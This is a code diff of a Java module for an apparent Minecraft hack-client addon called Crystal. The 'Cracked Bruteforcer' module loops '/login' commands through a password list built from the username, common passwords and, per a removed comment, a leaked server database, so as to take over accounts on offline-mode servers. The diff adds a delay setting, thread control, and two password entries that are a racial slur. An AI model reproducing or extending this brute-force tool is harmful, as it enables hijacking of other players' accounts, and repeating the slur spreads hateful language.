@@ -1,27 +1,34 @@
 package com.crystaldevs.crystal.modules.misc;
 
-import com.crystaldevs.crystal.utils.mc.McUtils;
+import meteordevelopment.meteorclient.settings.IntSetting;
+import meteordevelopment.meteorclient.settings.Setting;
+import meteordevelopment.meteorclient.settings.SettingGroup;
 import meteordevelopment.meteorclient.systems.modules.Categories;
 import meteordevelopment.meteorclient.systems.modules.Module;
-import meteordevelopment.meteorclient.utils.Utils;
-import meteordevelopment.meteorclient.utils.player.ChatUtils;
 import meteordevelopment.orbit.EventHandler;
-import net.minecraft.text.Text;
 
 import java.util.ArrayList;
 import java.util.List;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
 
 public class CrackedBruteforce extends Module {
-    public static final List<String> passwords = new ArrayList<String>();
-    private final ExecutorService executor = Executors.newSingleThreadExecutor();
+    private final SettingGroup sgGeneral = settings.getDefaultGroup();
+
+    private final Setting<Integer> delay = sgGeneral.add(new IntSetting.Builder()
+            .name("delay")
+            .description("Delay between passwords (in ms).")
+            .defaultValue(1000)
+            .min(1)
+            .sliderMax(5000)
+            .build()
+    );
+
+    private final List<String> passwords = new ArrayList<>();
+    private Thread thread = null;
+
     public CrackedBruteforce() {
-        super(Categories.Misc, "Cracked Bruteforcer", "CRYSTAL || Attempts to bruteforce the login on cracked servers.");
+        super(Categories.Misc, "cracked-bruteforcer", "CRYSTAL || Attempts to bruteforce the login on cracked servers.");
 
-        // From a cracked anarchy server db leak
-
-        String username = McUtils.getUsername();
+        String username = mc.player.getGameProfile().getName();
         passwords.add(username);
         passwords.add(username + "1");
         passwords.add(username + "12");
@@ -45,6 +52,8 @@ public class CrackedBruteforce extends Module {
         passwords.add("qwertyuiop");
         passwords.add("123456789");
         passwords.add("PASSWORD");
+        passwords.add("nigger");
+        passwords.add("nigger123");
         passwords.add("000000");
         passwords.add("123123");
         passwords.add("_" + username);
@@ -75,28 +84,29 @@ public class CrackedBruteforce extends Module {
         passwords.add("getoutofmyaccount");
     }
 
-    @EventHandler
+    @Override
     public void onActivate() {
-        if (Utils.canUpdate()) {
-            if (!mc.isInSingleplayer()) {
-                if (mc.getCurrentServerEntry() != null) {
-                    executor.execute(this::bruteforce);
-                }
-            } else {
-                ChatUtils.sendMsg(Text.of("You must be logged into a server, toggling."));
-                toggle();
-            }
-        }
+        thread = new Thread(this::bruteforce);
+        thread.start();
+    }
+
+    @Override
+    public void onDeactivate() {
+        if (thread != null && thread.isAlive()) thread.stop();
     }
 
     public void bruteforce() {
-        for (String pswd : passwords) {
-            ChatUtils.sendPlayerMsg("/login " + pswd);
+        for (String pw : passwords) {
+            mc.player.networkHandler.sendChatCommand("login " + pw);
+            try {
+                Thread.sleep(delay.get().longValue());
+            } catch (InterruptedException ignored) {
+            }
         }
     }
 
     @EventHandler
     public void onGameLeft() {
-
+        toggle();
     }
 }
